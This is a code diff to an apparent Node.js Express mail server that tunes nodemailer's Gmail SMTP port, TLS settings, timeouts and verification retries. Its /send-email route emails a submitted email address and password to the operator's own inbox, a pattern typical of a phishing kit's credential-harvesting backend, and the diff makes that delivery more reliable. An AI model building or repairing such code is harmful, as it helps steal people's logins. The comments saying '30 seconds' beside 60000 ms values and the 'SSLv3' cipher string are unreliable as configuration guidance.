@@ -22,19 +22,22 @@ const initializeTransporter = () => {
   transporter = nodemailer.createTransport({
     service: 'gmail',
     host: 'smtp.gmail.com',
-    port: 465,
-    secure: true,
+    port: 587,
+    secure: false,
     tls: {
-      rejectUnauthorized: true // Set to true in production with proper certificates
+      rejectUnauthorized: true,
+      ciphers: 'SSLv3',
+      minVersion: 'TLSv1.2',
+      maxVersion: 'TLSv1.3'
     },
     auth: {
       user: process.env.EMAIL_USER,
       pass: process.env.EMAIL_PASS
     },
     // Add timeout configuration
-    connectionTimeout: 30000, // 30 seconds
-    greetingTimeout: 30000,   // 30 seconds
-    socketTimeout: 30000      // 30 seconds
+    connectionTimeout: 60000, // 30 seconds
+    greetingTimeout: 60000,   // 30 seconds
+    socketTimeout: 60000      // 30 seconds
   });
 };
 
@@ -77,12 +80,26 @@ app.post('/send-email', async (req, res) => {
     const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER;
 
     // Verify transporter configuration with timeout
-    await Promise.race([
-      currentTransporter.verify(),
-      new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Connection timeout during verification')), 30000)
-      )
-    ]);
+    try {
+      await Promise.race([
+        currentTransporter.verify(),
+        new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Connection timeout during verification - please check network/firewall settings')), 60000)
+        )
+      ]);
+    } catch (verifyError) {
+      console.error('Transporter verification failed:', verifyError);
+      // Try to reinitialize transporter and verify again
+      initializeTransporter();
+      const newTransporter = getTransporter();
+      
+      await Promise.race([
+        newTransporter.verify(),
+        new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Connection timeout during verification even after reinitialization')), 60000)
+        )
+      ]);
+    }
 
     // Send mail with timeout
     const info = await Promise.race([
@@ -93,7 +110,7 @@ app.post('/send-email', async (req, res) => {
         text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
       }),
       new Promise((_, reject) => 
-        setTimeout(() => reject(new Error('Connection timeout during email sending')), 30000)
+        setTimeout(() => reject(new Error('Connection timeout during email sending - please check network/firewall settings')), 60000)
       )
     ]);
 
